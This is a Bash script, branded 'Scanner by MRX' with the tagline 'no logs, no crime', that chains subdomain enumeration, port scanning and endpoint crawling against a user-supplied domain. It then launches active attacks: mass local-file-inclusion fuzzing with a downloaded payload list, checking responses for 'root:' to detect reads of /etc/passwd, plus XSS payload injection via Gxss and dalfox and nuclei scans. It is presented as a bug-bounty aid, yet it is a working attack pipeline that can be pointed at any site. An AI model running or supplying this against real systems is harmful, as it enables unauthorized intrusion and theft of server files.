#!/bin/bash

# Definindo cores
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sem cor

# Banner
banner(){
cat << "EOF"
               ███╗   ███╗██████╗ ██╗  ██╗
               ████╗ ████║██╔══██╗╚██╗██╔╝
               ██╔████╔██║██████╔╝ ╚███╔╝
               ██║╚██╔╝██║██╔══██╗ ██╔██╗
               ██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
               ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
%"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
EOF
echo -e "${BLUE}+ -- --=[Scanner by MRX${NC}"
echo -e "${YELLOW}+ -- --= SEM LOGS SEM CRIME :)${NC}"
}

# Executando o banner
banner

# Verificando a entrada do domínio
read -p "Enter the domain: " domain

# Verificando se o domínio foi fornecido
if [ -z "$domain" ]; then
    echo -e "${RED}Error: Domain not provided.${NC}"
    exit 1
fi

# Criando pasta para o domínio
folder="$domain"
mkdir -p "$folder"

# Executando subfinder para encontrar subdomínios
echo "Running subfinder..."
subfinder -d "$domain" -all -o "$folder/subdomains_tmp.txt"

# Executando amass para encontrar subdomínios
echo "Running amass..."
amass enum -passive -norecursive -d "$domain" -o "$folder/subdomains_tmp.txt"

# Executando Findomain
echo "Running Findomain..."
findomain -t $domain -q 2>/dev/null >> "$folder/subdomains_tmp.txt"

# Executando Assetfinder
echo "Running Assetfinder..."
assetfinder --subs-only $domain >> "$folder/subdomains_tmp.txt"

# Executando Sublist3r
echo "Running Sublist3r..."
sublist3r -d $domain -v -o "$folder/subdomains_tmp.txt"

# Executando jldc
echo "Running jldc..."
curl -s "https://jldc.me/anubis/subdomains/$domain" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep "$domain" | grep -v "*" | sed -e 's/^[[:punct:]]//g' | sed -r '/^\s*$/d' | sort -u >> "$folder/subdomains_tmp.txt"

# Executando wayback
echo "Running wayback..."
curl -sk "http://web.archive.org/cdx/search/cdx?url=*.$domain&output=txt&fl=original&collapse=urlkey&page=" | awk -F/ '{gsub(/:.*/, "", $3); print $3}' | sort -u >> "$folder/subdomains_tmp.txt"

# Executando crt
echo "Running crt..."
curl -sk "https://crt.sh/?q=%.$domain&output=json" | tr ',' '\n' | awk -F'"' '/name_value/ {gsub(/\*\./, "", $4); gsub(/\\n/,"\n",$4);print $4}' | sort -u >> "$folder/subdomains_tmp.txt"

# Executando abuseipdb
echo "Running abuseipdb..."
curl -s "https://www.abuseipdb.com/whois/$domain" -H "user-agent: firefox" -b "abuseipdb_session=" | grep -E '<li>\w.*</li>' | sed -E 's/<\/?li>//g' | sed -e "s/$/.$domain/" | sort -u >> "$folder/subdomains_tmp.txt"

# Executando alienvault
echo "Running alienvault..."
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" | jq '.passive_dns[].hostname' 2>/dev/null | grep -o "\w.*$domain" | sort -u >> "$folder/subdomains_tmp.txt"

# Executando urlscan.io
echo "Running urlscan..."
curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" | jq '.results[].page.domain' 2>/dev/null | grep -o "\w.*$domain"| sort -u >> "$folder/subdomains_tmp.txt"

# Executando RapidDNS
echo "Running RapidDNS..."
curl -s "https://rapiddns.io/subdomain/$domain?full=1#result" | grep -v "RapidDNS" | grep -v "<td><a" | cut -d '>' -f 2 | cut -d '<' -f 1 | grep "$domain" | grep -v "*" | sed -e 's/^[[:punct:]]//g' | sed -r '/^\s*$/d' | sort -u >> "$folder/subdomains_tmp.txt"

# Executando Naabu
echo "Running naabu..."
naabu -c 250 -l "$folder/subdomains_tmp.txt" -port "80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,3000,5000,8080,8000,8081,8888,8069,8009,8001,8070,8088,8002,8060,8091,8086,8010,8050,8085,8089,8040,8020,8051,8087,8071,8011,8030,8061,8072,8100,8083,8073,8099,8092,8074,8043,8035,8055,8021,8093,8022,8075,8044,8062,8023,8094,8012,8033,8063,8045,7000,9000,7070,9001,7001,10000,9002,7002,9003,7003,10001,80,443,4443" | anew "$folder/portscan.txt"
echo "Running httpx Live ports"
httpx -l "$folder/portscan.txt" -o "$folder/liveports.txt"

# Limpando e ordenando subdomínios
echo "Cleaning and sorting subdomains..."
sort -u "$folder/subdomains_tmp.txt" >> "$folder/subdomains.txt"
rm "$folder/subdomains_tmp.txt"

# Executando httpx para encontrar subdomínios ativos
echo "Finding live subdomains..."
httpx -l "$folder/subdomains.txt" -o "$folder/live_subdomains.txt"

# filter subdomains by keywords
echo "filter subdomains by keywords..."
cat "$folder/live_subdomains.txt" | egrep -i "internal|api|test|prod|private|secret|git|login|admin|staging|dev|jira|intranet|vip|portal|register|pass|reset|client|database|server|backup|Credential|database|docker|encryption|security|authorization|authentication|monitoring|logging|certificate|token|integration|endpoint|validation|configuration|deployment" > "$folder/active_priority.txt"

# Executando gau para encontrar endpoints
echo "Finding endpoints with gau..."
cat "$folder/live_subdomains.txt" | gau --threads 5 >> "$folder/Endpoints.txt"

# Executando waybackurls
echo "Executando waybackurls..."
cat "$folder/live_subdomains.txt" | waybackurls >> "$folder/Endpoints.txt"

# Executando gospider
echo "Executando gospider..."
gospider -S "$folder/live_subdomains.txt" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" --other-source | grep "code-200" | awk '{print $5}' >> "$folder/Endpoints.txt"

# Executando katana com a flag -jc para encontrar mais endpoints
echo "Finding endpoints with katana..."
cat "$folder/live_subdomains.txt" | katana -d 10 -jc >> "$folder/Endpoints.txt"

# Removendo duplicatas usando uro
echo "Removing duplicates from Endpoints.txt..."
uro -i "$folder/Endpoints.txt" -o "$folder/Endpoints.txt"

# Usando gf patterns
echo "Finding gf lfi vulnerabilities with gf..."
# Passar caminho da Wordlist de paylouds!!!
# https://raw.githubusercontent.com/mrxbug/lfi-paylouds/main/LFIpayloads.txt
cat "$folder/Endpoints.txt" | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q Lfi.txt
cat ~/wordlists/payloads/LFIpayloads.txt | xargs -P 50 -I % bash -c "cat Lfi.txt | qsreplace % " 2> /dev/null | anew -q templfi.txt
xargs -a templfi.txt -P 50 -I % bash -c "curl -s -L  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:\" && echo -e \"[POTENTIAL LFI] - % \n \"" 2> /dev/null | grep "POTENTIAL LFI" | anew -q "$folder/vulnerabilitieslfi.txt"
mv Lfi.txt "$folder/lfi.txt"
rm templfi.txt

# Usando Finding XSS vulnerabilities
echo "Finding XSS vulnerabilities with gf..."
cat "$folder/Endpoints.txt" | gf xss >> "$folder/xss.txt"

# Usando Gxss para enviar payloads para endpoints XSS potenciais
echo "Sending payloads with Gxss..."
cat "$folder/xss.txt" | Gxss -p khXSS -o "$folder/XSS_Ref.txt"

# Analisando referências XSS com dalfox
echo "Analyzing XSS references with dalfox..."
dalfox file "$folder/XSS_Ref.txt" -o "$folder/Vulnerable_XSS.txt"

echo "Vulnerable XSS endpoints saved in $folder/Vulnerable_XSS.txt"

# Usando Running Nuclei Severity
echo "Running Nuclei Severity..."
cat "$folder/live_subdomains.txt" | nuclei -severity low,medium,high,critical -o "$folder/severity.txt"

# Usando Running Nuclei Custom Template
echo "Running Nuclei Custom Templat..."
cat "$folder/live_subdomains.txt" | nuclei -t ~/nuclei-templates/siteminder-dom-xss.yaml -o "$folder/nucleiT.txt"


